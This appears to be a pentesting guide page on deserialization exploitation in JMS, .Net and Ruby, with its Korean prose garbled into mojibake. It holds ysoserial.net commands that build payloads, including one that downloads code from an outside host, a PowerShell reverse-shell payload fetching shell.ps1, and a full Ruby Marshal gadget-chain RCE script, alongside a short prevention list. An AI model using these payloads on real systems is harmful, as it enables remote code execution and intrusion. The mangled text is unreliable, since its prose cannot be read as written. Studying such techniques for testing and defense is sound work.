> **Java ë©”ì‹œì§€ ì„œë¹„ìŠ¤** (**JMS**) APIëŠ” ë‘ ê°œ ì´ìƒì˜ í´ë¼ì´ì–¸íŠ¸ ê°„ì— ë©”ì‹œì§€ë¥¼ ì „ì†¡í•˜ê¸° ìœ„í•œ Java ë©”ì‹œì§€ ì§€í–¥ ë¯¸ë“¤ì›¨ì–´ APIì…ë‹ˆë‹¤. ì´ëŠ” ìƒì‚°ì-ì†Œë¹„ì ë¬¸ì œë¥¼ ì²˜ë¦¬í•˜ê¸° ìœ„í•œ êµ¬í˜„ì…ë‹ˆë‹¤. JMSëŠ” Java í”Œë«í¼, ì—”í„°í”„ë¼ì´ì¦ˆ ì—ë””ì…˜(Java EE)ì˜ ì¼ë¶€ì´ë©°, Sun Microsystemsì—ì„œ ê°œë°œí•œ ì‚¬ì–‘ì— ì˜í•´ ì •ì˜ë˜ì—ˆì§€ë§Œ ì´í›„ Java ì»¤ë®¤ë‹ˆí‹° í”„ë¡œì„¸ìŠ¤ì— ì˜í•´ ì•ˆë‚´ë˜ì—ˆìŠµë‹ˆë‹¤. ì´ëŠ” Java EE ê¸°ë°˜ì˜ ì• í”Œë¦¬ì¼€ì´ì…˜ êµ¬ì„± ìš”ì†Œê°€ ë©”ì‹œì§€ë¥¼ ìƒì„±, ì „ì†¡, ìˆ˜ì‹  ë° ì½ì„ ìˆ˜ ìˆë„ë¡ í•˜ëŠ” ë©”ì‹œì§• í‘œì¤€ì…ë‹ˆë‹¤. ì´ëŠ” ë¶„ì‚° ì• í”Œë¦¬ì¼€ì´ì…˜ì˜ ë‹¤ì–‘í•œ êµ¬ì„± ìš”ì†Œ ê°„ì˜ í†µì‹ ì„ ëŠìŠ¨í•˜ê²Œ ê²°í•©ë˜ê³  ì‹ ë¢°í•  ìˆ˜ ìˆìœ¼ë©° ë¹„ë™ê¸°ì ìœ¼ë¡œ ë§Œë“­ë‹ˆë‹¤. (ì¶œì²˜: [Wikipedia](https://en.wikipedia.org/wiki/Java\_Message\_Service)).

### ì œí’ˆ

ì´ ë¯¸ë“¤ì›¨ì–´ë¥¼ ì‚¬ìš©í•˜ì—¬ ë©”ì‹œì§€ë¥¼ ì „ì†¡í•˜ëŠ” ì—¬ëŸ¬ ì œí’ˆì´ ìˆìŠµë‹ˆë‹¤:

![https://www.blackhat.com/docs/us-16/materials/us-16-Kaiser-Pwning-Your-Java-Messaging-With-Deserialization-Vulnerabilities.pdf](<../../.gitbook/assets/image (314).png>)

![https://www.blackhat.com/docs/us-16/materials/us-16-Kaiser-Pwning-Your-Java-Messaging-With-Deserialization-Vulnerabilities.pdf](<../../.gitbook/assets/image (1056).png>)

### ì•…ìš©

ê¸°ë³¸ì ìœ¼ë¡œ **ìœ„í—˜í•œ ë°©ì‹ìœ¼ë¡œ JMSë¥¼ ì‚¬ìš©í•˜ëŠ” ì„œë¹„ìŠ¤ê°€ ë§ì´ ìˆìŠµë‹ˆë‹¤**. ë”°ë¼ì„œ ì´ëŸ¬í•œ ì„œë¹„ìŠ¤ì— ë©”ì‹œì§€ë¥¼ ì „ì†¡í•  **ì¶©ë¶„í•œ ê¶Œí•œ**ì´ ìˆë‹¤ë©´ (ì¼ë°˜ì ìœ¼ë¡œ ìœ íš¨í•œ ìê²© ì¦ëª…ì´ í•„ìš”í•¨) **ì†Œë¹„ì/êµ¬ë…ìê°€ ì—­ì§ë ¬í™”í•  ì•…ì˜ì ì¸ ì§ë ¬í™” ê°ì²´ë¥¼ ì „ì†¡í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤**.\
ì´ëŠ” ì´ ì•…ìš©ì—ì„œ **í•´ë‹¹ ë©”ì‹œì§€ë¥¼ ì‚¬ìš©í•  ëª¨ë“  í´ë¼ì´ì–¸íŠ¸ê°€ ê°ì—¼ë  ê²ƒ**ì„ì„ ì˜ë¯¸í•©ë‹ˆë‹¤.

ì„œë¹„ìŠ¤ê°€ ì·¨ì•½í•˜ë”ë¼ë„ (ì‚¬ìš©ì ì…ë ¥ì„ ì•ˆì „í•˜ì§€ ì•Šê²Œ ì—­ì§ë ¬í™”í•˜ëŠ” ê²½ìš°) ì—¬ì „íˆ ì·¨ì•½ì ì„ ì•…ìš©í•˜ê¸° ìœ„í•œ ìœ íš¨í•œ ê°€ì ¯ì„ ì°¾ì•„ì•¼ í•œë‹¤ëŠ” ì ì„ ê¸°ì–µí•´ì•¼ í•©ë‹ˆë‹¤.

ë„êµ¬ [JMET](https://github.com/matthiaskaiser/jmet)ëŠ” **ì•Œë ¤ì§„ ê°€ì ¯ì„ ì‚¬ìš©í•˜ì—¬ ì—¬ëŸ¬ ì•…ì˜ì ì¸ ì§ë ¬í™” ê°ì²´ë¥¼ ì „ì†¡í•˜ì—¬ ì´ ì„œë¹„ìŠ¤ë¥¼ ì—°ê²°í•˜ê³  ê³µê²©í•˜ê¸° ìœ„í•´ ìƒì„±ë˜ì—ˆìŠµë‹ˆë‹¤**. ì´ëŸ¬í•œ ìµìŠ¤í”Œë¡œì‡ì€ ì„œë¹„ìŠ¤ê°€ ì—¬ì „íˆ ì·¨ì•½í•˜ê³  ì‚¬ìš©ëœ ê°€ì ¯ ì¤‘ í•˜ë‚˜ê°€ ì·¨ì•½í•œ ì• í”Œë¦¬ì¼€ì´ì…˜ ë‚´ì— ìˆì„ ê²½ìš° ì‘ë™í•©ë‹ˆë‹¤.

### ì°¸ê³  ë¬¸í—Œ

* JMET ê°•ì—°: [https://www.youtube.com/watch?v=0h8DWiOWGGA](https://www.youtube.com/watch?v=0h8DWiOWGGA)
* ìŠ¬ë¼ì´ë“œ: [https://www.blackhat.com/docs/us-16/materials/us-16-Kaiser-Pwning-Your-Java-Messaging-With-Deserialization-Vulnerabilities.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Kaiser-Pwning-Your-Java-Messaging-With-Deserialization-Vulnerabilities.pdf)

## .Net

.Netì˜ ë§¥ë½ì—ì„œ ì—­ì§ë ¬í™” ìµìŠ¤í”Œë¡œì‡ì€ Javaì—ì„œ ë°œê²¬ë˜ëŠ” ë°©ì‹ê³¼ ìœ ì‚¬í•˜ê²Œ ì‘ë™í•˜ë©°, ê°€ì ¯ì„ ì•…ìš©í•˜ì—¬ ê°ì²´ì˜ ì—­ì§ë ¬í™” ì¤‘ íŠ¹ì • ì½”ë“œë¥¼ ì‹¤í–‰í•©ë‹ˆë‹¤.

### ì§€ë¬¸

#### í™”ì´íŠ¸ë°•ìŠ¤

ì†ŒìŠ¤ ì½”ë“œëŠ” ë‹¤ìŒì˜ ë°œìƒ ì—¬ë¶€ë¥¼ ê²€ì‚¬í•´ì•¼ í•©ë‹ˆë‹¤:

1. `TypeNameHandling`
2. `JavaScriptTypeResolver`

ì‚¬ìš©ì ì œì–´ í•˜ì— ë³€ìˆ˜ë¥¼ í†µí•´ ìœ í˜•ì„ ê²°ì •í•  ìˆ˜ ìˆëŠ” ì§ë ¬í™”ê¸°ì— ì´ˆì ì„ ë§ì¶°ì•¼ í•©ë‹ˆë‹¤.

#### ë¸”ë™ë°•ìŠ¤

ê²€ìƒ‰ì€ ì„œë²„ ì¸¡ì—ì„œ ì—­ì§ë ¬í™”ë  ìˆ˜ ìˆëŠ” Base64 ì¸ì½”ë”© ë¬¸ìì—´ **AAEAAAD/////** ë˜ëŠ” ìœ ì‚¬í•œ íŒ¨í„´ì„ ëª©í‘œë¡œ í•´ì•¼ í•˜ë©°, ì´ëŠ” ì—­ì§ë ¬í™”ë  ìœ í˜•ì— ëŒ€í•œ ì œì–´ë¥¼ ë¶€ì—¬í•©ë‹ˆë‹¤. ì—¬ê¸°ì—ëŠ” `TypeObject` ë˜ëŠ” `$type`ì„ í¬í•¨í•œ **JSON** ë˜ëŠ” **XML** êµ¬ì¡°ê°€ í¬í•¨ë  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

### ysoserial.net

ì´ ê²½ìš° [**ysoserial.net**](https://github.com/pwntester/ysoserial.net) ë„êµ¬ë¥¼ ì‚¬ìš©í•˜ì—¬ **ì—­ì§ë ¬í™” ìµìŠ¤í”Œë¡œì‡ì„ ìƒì„±í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤**. git ì €ì¥ì†Œë¥¼ ë‹¤ìš´ë¡œë“œí•œ í›„, ì˜ˆë¥¼ ë“¤ì–´ Visual Studioë¥¼ ì‚¬ìš©í•˜ì—¬ **ë„êµ¬ë¥¼ ì»´íŒŒì¼í•´ì•¼ í•©ë‹ˆë‹¤**.

**ysoserial.netì´ ìµìŠ¤í”Œë¡œì‡ì„ ìƒì„±í•˜ëŠ” ë°©ë²•**ì— ëŒ€í•´ ë°°ìš°ê³  ì‹¶ë‹¤ë©´ [**ObjectDataProvider ê°€ì ¯ + ExpandedWrapper + Json.Net í¬ë§·í„°ê°€ ì„¤ëª…ëœ ì´ í˜ì´ì§€ë¥¼ í™•ì¸í•˜ì„¸ìš”**](basic-.net-deserialization-objectdataprovider-gadgets-expandedwrapper-and-json.net.md).

**ysoserial.net**ì˜ ì£¼ìš” ì˜µì…˜ì€: **`--gadget`**, **`--formatter`**, **`--output`** ë° **`--plugin`**ì…ë‹ˆë‹¤.

* **`--gadget`**ëŠ” ì•…ìš©í•  ê°€ì ¯ì„ ì§€ì •í•˜ëŠ” ë° ì‚¬ìš©ë©ë‹ˆë‹¤ (ì—­ì§ë ¬í™” ì¤‘ ëª…ë ¹ì„ ì‹¤í–‰í•˜ê¸° ìœ„í•´ ì•…ìš©ë  í´ë˜ìŠ¤/í•¨ìˆ˜ë¥¼ ì§€ì •).
* **`--formatter`**ëŠ” ìµìŠ¤í”Œë¡œì‡ì„ ì§ë ¬í™”í•˜ëŠ” ë°©ë²•ì„ ì§€ì •í•˜ëŠ” ë° ì‚¬ìš©ë©ë‹ˆë‹¤ (í˜ì´ë¡œë“œë¥¼ ì—­ì§ë ¬í™”í•˜ëŠ” ë° ì‚¬ìš©ë˜ëŠ” ë°±ì—”ë“œ ë¼ì´ë¸ŒëŸ¬ë¦¬ë¥¼ ì•Œì•„ì•¼ í•˜ë©°, ë™ì¼í•œ ë¼ì´ë¸ŒëŸ¬ë¦¬ë¥¼ ì‚¬ìš©í•˜ì—¬ ì§ë ¬í™”í•´ì•¼ í•©ë‹ˆë‹¤).
* **`--output`**ëŠ” ìµìŠ¤í”Œë¡œì‡ì„ **ì›ì‹œ** ë˜ëŠ” **base64** ì¸ì½”ë”©ìœ¼ë¡œ ì›í•˜ëŠ”ì§€ ì§€ì •í•˜ëŠ” ë° ì‚¬ìš©ë©ë‹ˆë‹¤. _**ysoserial.net**ì€ í˜ì´ë¡œë“œë¥¼ **UTF-16LE**ë¡œ **ì¸ì½”ë”©**í•˜ë¯€ë¡œ (Windowsì—ì„œ ê¸°ë³¸ì ìœ¼ë¡œ ì‚¬ìš©ë˜ëŠ” ì¸ì½”ë”©) ì›ì‹œ ë°ì´í„°ë¥¼ ê°€ì ¸ì™€ ë¦¬ëˆ…ìŠ¤ ì½˜ì†”ì—ì„œ ì¸ì½”ë”©í•˜ë©´ **ì¸ì½”ë”© í˜¸í™˜ì„± ë¬¸ì œ**ê°€ ë°œìƒí•  ìˆ˜ ìˆìœ¼ë©°, ì´ë¡œ ì¸í•´ ìµìŠ¤í”Œë¡œì‡ì´ ì œëŒ€ë¡œ ì‘ë™í•˜ì§€ ì•Šì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤ (HTB JSON ë°•ìŠ¤ì—ì„œëŠ” í˜ì´ë¡œë“œê°€ UTF-16LEì™€ ASCII ëª¨ë‘ì—ì„œ ì‘ë™í–ˆì§€ë§Œ, ì´ëŠ” í•­ìƒ ì‘ë™í•œë‹¤ëŠ” ì˜ë¯¸ëŠ” ì•„ë‹™ë‹ˆë‹¤)._
* **`--plugin`** ysoserial.netëŠ” ViewStateì™€ ê°™ì€ **íŠ¹ì • í”„ë ˆì„ì›Œí¬ë¥¼ ìœ„í•œ ìµìŠ¤í”Œë¡œì‡ì„ ì œì‘í•˜ê¸° ìœ„í•œ í”ŒëŸ¬ê·¸ì¸ì„ ì§€ì›í•©ë‹ˆë‹¤**.

#### ë” ë§ì€ ysoserial.net ë§¤ê°œë³€ìˆ˜

* `--minify`ëŠ” **ë” ì‘ì€ í˜ì´ë¡œë“œ**ë¥¼ ì œê³µí•©ë‹ˆë‹¤ (ê°€ëŠ¥í•œ ê²½ìš°).
* `--raf -f Json.Net -c "anything"` ì´ëŠ” ì œê³µëœ í¬ë§·í„°(`Json.Net`ì¸ ê²½ìš°)ì™€ í•¨ê»˜ ì‚¬ìš©í•  ìˆ˜ ìˆëŠ” ëª¨ë“  ê°€ì ¯ì„ ë‚˜íƒ€ëƒ…ë‹ˆë‹¤.
* `--sf xml`ëŠ” **ê°€ì ¯**(`-g`)ì„ ì§€ì •í•  ìˆ˜ ìˆìœ¼ë©°, ysoserial.netëŠ” "xml"ì„ í¬í•¨í•˜ëŠ” í¬ë§·í„°ë¥¼ ê²€ìƒ‰í•©ë‹ˆë‹¤ (ëŒ€ì†Œë¬¸ì êµ¬ë¶„ ì—†ìŒ).

**ysoserial ì˜ˆì œ**ë¥¼ í†µí•´ ìµìŠ¤í”Œë¡œì‡ì„ ìƒì„±í•©ë‹ˆë‹¤:
```bash
#Send ping
ysoserial.exe -g ObjectDataProvider -f Json.Net -c "ping -n 5 10.10.14.44" -o base64

#Timing
#I tried using ping and timeout but there wasn't any difference in the response timing from the web server

#DNS/HTTP request
ysoserial.exe -g ObjectDataProvider -f Json.Net -c "nslookup sb7jkgm6onw1ymw0867mzm2r0i68ux.burpcollaborator.net" -o base64
ysoserial.exe -g ObjectDataProvider -f Json.Net -c "certutil -urlcache -split -f http://rfaqfsze4tl7hhkt5jtp53a1fsli97.burpcollaborator.net/a a" -o base64

#Reverse shell
#Create shell command in linux
echo -n "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.44/shell.ps1')" | iconv  -t UTF-16LE | base64 -w0
#Create exploit using the created B64 shellcode
ysoserial.exe -g ObjectDataProvider -f Json.Net -c "powershell -EncodedCommand SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAMAAuADEAMAAuADEANAAuADQANAAvAHMAaABlAGwAbAAuAHAAcwAxACcAKQA=" -o base64
```
**ysoserial.net**ì—ëŠ” ê° ìµìŠ¤í”Œë¡œì‡ì´ ì–´ë–»ê²Œ ì‘ë™í•˜ëŠ”ì§€ ë” ì˜ ì´í•´í•˜ëŠ” ë° ë„ì›€ì´ ë˜ëŠ” **ë§¤ìš° í¥ë¯¸ë¡œìš´ ë§¤ê°œë³€ìˆ˜**ê°€ ìˆìŠµë‹ˆë‹¤: `--test`\
ì´ ë§¤ê°œë³€ìˆ˜ë¥¼ ì§€ì •í•˜ë©´ **ysoserial.net**ì´ **ë¡œì»¬ì—ì„œ** **ìµìŠ¤í”Œë¡œì‡ì„ ì‹œë„**í•˜ë¯€ë¡œ í˜ì´ë¡œë“œê°€ ì˜¬ë°”ë¥´ê²Œ ì‘ë™í•˜ëŠ”ì§€ í…ŒìŠ¤íŠ¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.\
ì´ ë§¤ê°œë³€ìˆ˜ëŠ” ì½”ë“œ ê²€í†  ì‹œ ë‹¤ìŒê³¼ ê°™ì€ ì½”ë“œ ì¡°ê°ì„ ì°¾ì„ ìˆ˜ ìˆê¸° ë•Œë¬¸ì— ìœ ìš©í•©ë‹ˆë‹¤ ( [ObjectDataProviderGenerator.cs](https://github.com/pwntester/ysoserial.net/blob/c53bd83a45fb17eae60ecc82f7147b5c04b07e42/ysoserial/Generators/ObjectDataProviderGenerator.cs#L208)):
```java
if (inputArgs.Test)
{
try
{
SerializersHelper.JsonNet_deserialize(payload);
}
catch (Exception err)
{
Debugging.ShowErrors(inputArgs, err);
}
}
```
ì´ê²ƒì€ ìµìŠ¤í”Œë¡œì‡ì„ í…ŒìŠ¤íŠ¸í•˜ê¸° ìœ„í•´ ì½”ë“œê°€ [serializersHelper.JsonNet\_deserialize](https://github.com/pwntester/ysoserial.net/blob/c53bd83a45fb17eae60ecc82f7147b5c04b07e42/ysoserial/Helpers/SerializersHelper.cs#L539)ë¥¼ í˜¸ì¶œí•  ê²ƒì„ì„ ì˜ë¯¸í•©ë‹ˆë‹¤.
```java
public static object JsonNet_deserialize(string str)
{
Object obj = JsonConvert.DeserializeObject<Object>(str, new JsonSerializerSettings
{
TypeNameHandling = TypeNameHandling.Auto
});
return obj;
}
```
In the **ì´ì „ ì½”ë“œëŠ” ìƒì„±ëœ ìµìŠ¤í”Œë¡œì‡ì— ì·¨ì•½í•©ë‹ˆë‹¤**. ë”°ë¼ì„œ .Net ì• í”Œë¦¬ì¼€ì´ì…˜ì—ì„œ ìœ ì‚¬í•œ ê²ƒì„ ë°œê²¬í•˜ë©´ í•´ë‹¹ ì• í”Œë¦¬ì¼€ì´ì…˜ë„ ì·¨ì•½í•  ê°€ëŠ¥ì„±ì´ ë†’ìŠµë‹ˆë‹¤.\
ë”°ë¼ì„œ **`--test`** ë§¤ê°œë³€ìˆ˜ëŠ” **ì–´ë–¤ ì½”ë“œ ì¡°ê°ì´** **ysoserial.net**ì´ ìƒì„±í•  ìˆ˜ ìˆëŠ” ì—­ì§ë ¬í™” ìµìŠ¤í”Œë¡œì‡ì— ì·¨ì•½í•œì§€ ì´í•´í•˜ëŠ” ë° ë„ì›€ì„ ì¤ë‹ˆë‹¤.

### ViewState

[**.Netì˜ \_\_ViewState ë§¤ê°œë³€ìˆ˜ë¥¼ ì•…ìš©í•˜ëŠ” ë°©ë²•ì— ëŒ€í•œ ì´ POSTë¥¼ í™•ì¸í•˜ì„¸ìš”**](exploiting-\_\_viewstate-parameter.md) **ì„ì˜ ì½”ë“œë¥¼ ì‹¤í–‰í•˜ê¸° ìœ„í•´.** ë§Œì•½ **í”¼í•´ì ë¨¸ì‹ ì—ì„œ ì‚¬ìš©ëœ ë¹„ë°€ì„ ì´ë¯¸ ì•Œê³  ìˆë‹¤ë©´**, [**ì½”ë“œë¥¼ ì‹¤í–‰í•˜ëŠ” ë°©ë²•ì„ ì•Œì•„ë³´ë ¤ë©´ ì´ í¬ìŠ¤íŠ¸ë¥¼ ì½ìœ¼ì„¸ìš”**](exploiting-\_\_viewstate-knowing-the-secret.md)**.**

### Prevention

.Netì—ì„œ ì—­ì§ë ¬í™”ì™€ ê´€ë ¨ëœ ìœ„í—˜ì„ ì™„í™”í•˜ê¸° ìœ„í•´:

* **ë°ì´í„° ìŠ¤íŠ¸ë¦¼ì´ ê°ì²´ ìœ í˜•ì„ ì •ì˜í•˜ë„ë¡ í—ˆìš©í•˜ì§€ ë§ˆì‹­ì‹œì˜¤.** ê°€ëŠ¥í•  ê²½ìš° `DataContractSerializer` ë˜ëŠ” `XmlSerializer`ë¥¼ ì‚¬ìš©í•˜ì‹­ì‹œì˜¤.
* **`JSON.Net`ì˜ ê²½ìš° `TypeNameHandling`ì„ `None`ìœ¼ë¡œ ì„¤ì •í•˜ì‹­ì‹œì˜¤:** %%%TypeNameHandling = TypeNameHandling.None%%%
* **`JavaScriptTypeResolver`ì™€ í•¨ê»˜ `JavaScriptSerializer`ë¥¼ ì‚¬ìš©í•˜ì§€ ë§ˆì‹­ì‹œì˜¤.**
* **ì—­ì§ë ¬í™”í•  ìˆ˜ ìˆëŠ” ìœ í˜•ì„ ì œí•œí•˜ì‹­ì‹œì˜¤**, `System.IO.FileInfo`ì™€ ê°™ì€ .Net ìœ í˜•ì˜ ê³ ìœ í•œ ìœ„í—˜ì„ ì´í•´í•˜ì‹­ì‹œì˜¤. ì´ëŠ” ì„œë²„ íŒŒì¼ì˜ ì†ì„±ì„ ìˆ˜ì •í•  ìˆ˜ ìˆì–´ ì„œë¹„ìŠ¤ ê±°ë¶€ ê³µê²©ìœ¼ë¡œ ì´ì–´ì§ˆ ìˆ˜ ìˆìŠµë‹ˆë‹¤.
* **ìœ„í—˜í•œ ì†ì„±ì„ ê°€ì§„ ìœ í˜•ì— ì£¼ì˜í•˜ì‹­ì‹œì˜¤**, `Value` ì†ì„±ì´ ìˆëŠ” `System.ComponentModel.DataAnnotations.ValidationException`ê³¼ ê°™ì´ ì•…ìš©ë  ìˆ˜ ìˆìŠµë‹ˆë‹¤.
* **íƒ€ì… ì¸ìŠ¤í„´ìŠ¤í™”ë¥¼ ì•ˆì „í•˜ê²Œ ì œì–´í•˜ì‹­ì‹œì˜¤**. ê³µê²©ìê°€ ì—­ì§ë ¬í™” í”„ë¡œì„¸ìŠ¤ì— ì˜í–¥ì„ ë¯¸ì¹˜ì§€ ì•Šë„ë¡ í•˜ì—¬ `DataContractSerializer` ë˜ëŠ” `XmlSerializer`ì¡°ì°¨ë„ ì·¨ì•½í•˜ê²Œ ë§Œë“¤ ìˆ˜ ìˆìŠµë‹ˆë‹¤.
* **`BinaryFormatter` ë° `JSON.Net`ì— ëŒ€í•´ ì‚¬ìš©ì ì •ì˜ `SerializationBinder`ë¥¼ ì‚¬ìš©í•˜ì—¬ í™”ì´íŠ¸ë¦¬ìŠ¤íŠ¸ ì œì–´ë¥¼ êµ¬í˜„í•˜ì‹­ì‹œì˜¤.**
* **.Net ë‚´ì—ì„œ ì•Œë ¤ì§„ ë¶ˆì•ˆì „í•œ ì—­ì§ë ¬í™” ê°€ì ¯ì— ëŒ€í•œ ì •ë³´ë¥¼ ìœ ì§€í•˜ê³ ** ì—­ì§ë ¬í™”ê¸°ê°€ ê·¸ëŸ¬í•œ ìœ í˜•ì„ ì¸ìŠ¤í„´ìŠ¤í™”í•˜ì§€ ì•Šë„ë¡ í•˜ì‹­ì‹œì˜¤.
* **ì ì¬ì ìœ¼ë¡œ ìœ„í—˜í•œ ì½”ë“œë¥¼ ì¸í„°ë„·ì— ì ‘ê·¼í•  ìˆ˜ ìˆëŠ” ì½”ë“œì™€ ê²©ë¦¬í•˜ì—¬** `System.Windows.Data.ObjectDataProvider`ì™€ ê°™ì€ ì•Œë ¤ì§„ ê°€ì ¯ì„ ì‹ ë¢°í•  ìˆ˜ ì—†ëŠ” ë°ì´í„° ì†ŒìŠ¤ì— ë…¸ì¶œë˜ì§€ ì•Šë„ë¡ í•˜ì‹­ì‹œì˜¤.

### **References**

* Javaì™€ .Net JSON ì—­ì§ë ¬í™” **ë…¼ë¬¸:** [**https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-JSON-Attacks-wp.pdf**](https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-JSON-Attacks-wp.pdf)**,** ê°•ì—°: [https://www.youtube.com/watch?v=oUAeWhW5b8c](https://www.youtube.com/watch?v=oUAeWhW5b8c) ë° ìŠ¬ë¼ì´ë“œ: [https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-Json-Attacks.pdf](https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-Json-Attacks.pdf)
* [https://cheatsheetseries.owasp.org/cheatsheets/Deserialization\_Cheat\_Sheet.html#net-csharp](https://cheatsheetseries.owasp.org/cheatsheets/Deserialization\_Cheat\_Sheet.html#net-csharp)
* [https://media.blackhat.com/bh-us-12/Briefings/Forshaw/BH\_US\_12\_Forshaw\_Are\_You\_My\_Type\_WP.pdf](https://media.blackhat.com/bh-us-12/Briefings/Forshaw/BH\_US\_12\_Forshaw\_Are\_You\_My\_Type\_WP.pdf)
* [https://www.slideshare.net/MSbluehat/dangerous-contents-securing-net-deserialization](https://www.slideshare.net/MSbluehat/dangerous-contents-securing-net-deserialization)

## **Ruby**

ë£¨ë¹„ì—ì„œ ì§ë ¬í™”ëŠ” **marshal** ë¼ì´ë¸ŒëŸ¬ë¦¬ ë‚´ì˜ ë‘ ê°€ì§€ ë©”ì„œë“œì— ì˜í•´ ìš©ì´í•´ì§‘ë‹ˆë‹¤. ì²« ë²ˆì§¸ ë©”ì„œë“œëŠ” **dump**ë¡œ ì•Œë ¤ì ¸ ìˆìœ¼ë©°, ê°ì²´ë¥¼ ë°”ì´íŠ¸ ìŠ¤íŠ¸ë¦¼ìœ¼ë¡œ ë³€í™˜í•˜ëŠ” ë° ì‚¬ìš©ë©ë‹ˆë‹¤. ì´ ê³¼ì •ì„ ì§ë ¬í™”ë¼ê³  í•©ë‹ˆë‹¤. ë°˜ëŒ€ë¡œ ë‘ ë²ˆì§¸ ë©”ì„œë“œì¸ **load**ëŠ” ë°”ì´íŠ¸ ìŠ¤íŠ¸ë¦¼ì„ ë‹¤ì‹œ ê°ì²´ë¡œ ë˜ëŒë¦¬ëŠ” ë° ì‚¬ìš©ë˜ë©°, ì´ë¥¼ ì—­ì§ë ¬í™”ë¼ê³  í•©ë‹ˆë‹¤.

ì§ë ¬í™”ëœ ê°ì²´ë¥¼ ë³´í˜¸í•˜ê¸° ìœ„í•´ **ë£¨ë¹„ëŠ” HMAC (Hash-Based Message Authentication Code)**ë¥¼ ì‚¬ìš©í•˜ì—¬ ë°ì´í„°ì˜ ë¬´ê²°ì„±ê³¼ ì§„ìœ„ë¥¼ ë³´ì¥í•©ë‹ˆë‹¤. ì´ë¥¼ ìœ„í•´ ì‚¬ìš©ë˜ëŠ” í‚¤ëŠ” ì—¬ëŸ¬ ê°€ëŠ¥í•œ ìœ„ì¹˜ ì¤‘ í•˜ë‚˜ì— ì €ì¥ë©ë‹ˆë‹¤:

* `config/environment.rb`
* `config/initializers/secret_token.rb`
* `config/secrets.yml`
* `/proc/self/environ`

**ë£¨ë¹„ 2.X ì¼ë°˜ ì—­ì§ë ¬í™”ì—ì„œ RCE ê°€ì ¯ ì²´ì¸ (ìì„¸í•œ ì •ë³´ëŠ”** [**https://www.elttam.com/blog/ruby-deserialization/**](https://www.elttam.com/blog/ruby-deserialization/)**)**:
```ruby
#!/usr/bin/env ruby

# Code from https://www.elttam.com/blog/ruby-deserialization/

class Gem::StubSpecification
def initialize; end
end


stub_specification = Gem::StubSpecification.new
stub_specification.instance_variable_set(:@loaded_from, "|id 1>&2")#RCE cmd must start with "|" and end with "1>&2"

puts "STEP n"
stub_specification.name rescue nil
puts


class Gem::Source::SpecificFile
def initialize; end
end

specific_file = Gem::Source::SpecificFile.new
specific_file.instance_variable_set(:@spec, stub_specification)

other_specific_file = Gem::Source::SpecificFile.new

puts "STEP n-1"
specific_file <=> other_specific_file rescue nil
puts


$dependency_list= Gem::DependencyList.new
$dependency_list.instance_variable_set(:@specs, [specific_file, other_specific_file])

puts "STEP n-2"
$dependency_list.each{} rescue nil
puts


class Gem::Requirement
def marshal_dump
[$dependency_list]
end
end

payload = Marshal.dump(Gem::Requirement.new)

puts "STEP n-3"
Marshal.load(payload) rescue nil
puts


puts "VALIDATION (in fresh ruby process):"
IO.popen("ruby -e 'Marshal.load(STDIN.read) rescue nil'", "r+") do |pipe|
pipe.print payload
pipe.close_write
puts pipe.gets
puts
end

puts "Payload (hex):"
puts payload.unpack('H*')[0]
puts


require "base64"
puts "Payload (Base64 encoded):"
puts Base64.encode64(payload)
```
Other RCE chain to exploit Ruby On Rails: [https://codeclimate.com/blog/rails-remote-code-execution-vulnerability-explained/](https://codeclimate.com/blog/rails-remote-code-execution-vulnerability-explained/)

### Ruby .send() ë©”ì„œë“œ

[**ì´ ì·¨ì•½ì  ë³´ê³ ì„œ**](https://starlabs.sg/blog/2024/04-sending-myself-github-com-environment-variables-and-ghes-shell/)ì—ì„œ ì„¤ëª…ëœ ë°”ì™€ ê°™ì´, ì¼ë¶€ ì‚¬ìš©ìë¡œë¶€í„° ë¹„ì •ìƒí™”ëœ ì…ë ¥ì´ ë£¨ë¹„ ê°ì²´ì˜ `.send()` ë©”ì„œë“œì— ë„ë‹¬í•˜ë©´, ì´ ë©”ì„œë“œëŠ” ê°ì²´ì˜ **ë‹¤ë¥¸ ë©”ì„œë“œë¥¼ í˜¸ì¶œ**í•  ìˆ˜ ìˆê²Œ í•´ì¤ë‹ˆë‹¤.

ì˜ˆë¥¼ ë“¤ì–´, evalì„ í˜¸ì¶œí•˜ê³  ë‘ ë²ˆì§¸ ë§¤ê°œë³€ìˆ˜ë¡œ ë£¨ë¹„ ì½”ë“œë¥¼ ì „ë‹¬í•˜ë©´ ì„ì˜ì˜ ì½”ë“œë¥¼ ì‹¤í–‰í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:

{% code overflow="wrap" %}
```ruby
<Object>.send('eval', '<user input with Ruby code>') == RCE
```
{% endcode %}

ê²Œë‹¤ê°€, **`.send()`**ì˜ ë§¤ê°œë³€ìˆ˜ ì¤‘ í•˜ë‚˜ë§Œ ê³µê²©ìê°€ ì œì–´í•  ìˆ˜ ìˆë‹¤ë©´, ì´ì „ ê¸€ì—ì„œ ì–¸ê¸‰í•œ ë°”ì™€ ê°™ì´, **ì¸ìˆ˜ê°€ í•„ìš” ì—†ëŠ”** ê°ì²´ì˜ ëª¨ë“  ë©”ì„œë“œë‚˜ **ê¸°ë³¸ê°’ì´ ìˆëŠ”** ì¸ìˆ˜ë¥¼ ê°€ì§„ ë©”ì„œë“œë¥¼ í˜¸ì¶œí•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.\
